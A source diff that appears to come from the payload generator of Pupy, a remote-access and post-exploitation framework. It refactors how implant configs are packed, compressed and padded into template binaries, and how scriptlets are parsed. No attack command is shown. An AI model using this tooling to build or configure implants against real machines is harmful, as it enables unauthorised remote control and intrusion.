@@ -6,7 +6,7 @@
 import logging, argparse, sys, os.path, re, shlex, random, string, zipfile, tarfile, tempfile, shutil, subprocess, traceback, pkgutil
 from pupylib.utils.network import get_listener_ip, get_listener_port
 from pupylib.utils.term import colorize
-from pupylib.payloads.python_packer import gen_package_pickled_dic
+from pupylib.payloads import dependencies
 from pupylib.payloads.py_oneliner import serve_payload, pack_py_payload, getLinuxImportedModules
 from pupylib.payloads.rubber_ducky import rubber_ducky
 from pupylib.utils.obfuscate import compress_encode_obfs
@@ -60,13 +60,12 @@ def get_edit_binary(path, conf):
     elif len(offsets) > 1:
         raise Exception("Error: multiple offsets to edit the config have been found")
 
-    new_conf = marshal.dumps(compile(get_raw_conf(conf), '<string>', 'exec'))
+    new_conf = marshal.dumps(compile(get_raw_conf(conf), '<config>', 'exec'))
     uncompressed = len(new_conf)
     new_conf = pylzma.compress(new_conf)
     compressed = len(new_conf)
     new_conf = struct.pack('>II', compressed, uncompressed) + new_conf
     new_conf_len = len(new_conf)
-
 
     if new_conf_len > HARDCODED_CONF_SIZE:
         raise Exception(
@@ -75,6 +74,8 @@ def get_edit_binary(path, conf):
         )
 
     new_conf = new_conf + os.urandom(HARDCODED_CONF_SIZE-new_conf_len)
+
+    logging.debug('Free space: {}'.format(HARDCODED_CONF_SIZE-new_conf_len))
 
     offset = offsets[0]
     binary = binary[0:offset]+new_conf+binary[offset+HARDCODED_CONF_SIZE:]
@@ -125,6 +126,9 @@ def get_raw_conf(conf, obfuscate=False, verbose=False):
 
     if verbose:
         for k, v in conf.iteritems():
+            if k in ('offline_script'):
+                continue
+
             print colorize("[C] {}: {}".format(k, v), "yellow")
 
     config = '\n'.join([
@@ -132,12 +136,9 @@ def get_raw_conf(conf, obfuscate=False, verbose=False):
             repr(cPickle.dumps({
                 'pupy_credentials.py' : embedded_credentials
             }))),
-        '\n'.join([
-            'pupyimporter.pupy_add_package({})'.format(
-                repr(cPickle.dumps(gen_package_pickled_dic(
-                    ROOT+os.sep, 'network.transports.{}'.format(transport)
-                    )))) for transport in transports_list
-        ]),
+        dependencies.importer(set(
+            'network.transports.{}'.format(transport) for transport in transports_list
+        ), path=ROOT),
         'import sys',
         'sys.modules.pop("network.conf")',
         'import network.conf',
@@ -311,6 +312,9 @@ def generate_binary_from_template(config, osname, arch=None, shared=False, debug
         raise ValueError('Template not found ({})'.format(template))
 
     for k, v in config.iteritems():
+        if k in ('offline_script'):
+            continue
+
         print colorize("[C] {}: {}".format(k, v), "yellow")
 
     return generator(template, config), filename, makex
@@ -329,9 +333,9 @@ def load_scriptlets():
                         scl[module_name]=module2.ScriptletGenerator
     return scl
 
-def parse_scriptlets(args_scriptlet, debug=False):
-    scriptlets_dic=load_scriptlets()
-    sp=scriptlets.scriptlets.ScriptletsPacker(debug=debug)
+def parse_scriptlets(args_scriptlet, os=None, arch=None, debug=False):
+    scriptlets_dic = load_scriptlets()
+    sp = scriptlets.scriptlets.ScriptletsPacker(os, arch, debug=debug)
     for sc in args_scriptlet:
         tab=sc.split(",",1)
         sc_args={}
@@ -439,7 +443,12 @@ def pupygen(args, config):
 
     script_code=""
     if args.scriptlet:
-        script_code=parse_scriptlets(args.scriptlet, debug=args.debug_scriptlets)
+        script_code=parse_scriptlets(
+            args.scriptlet,
+            os=args.os,
+            arch=args.arch,
+            debug=args.debug_scriptlets
+        )
 
 
     l = launchers[args.launcher]()
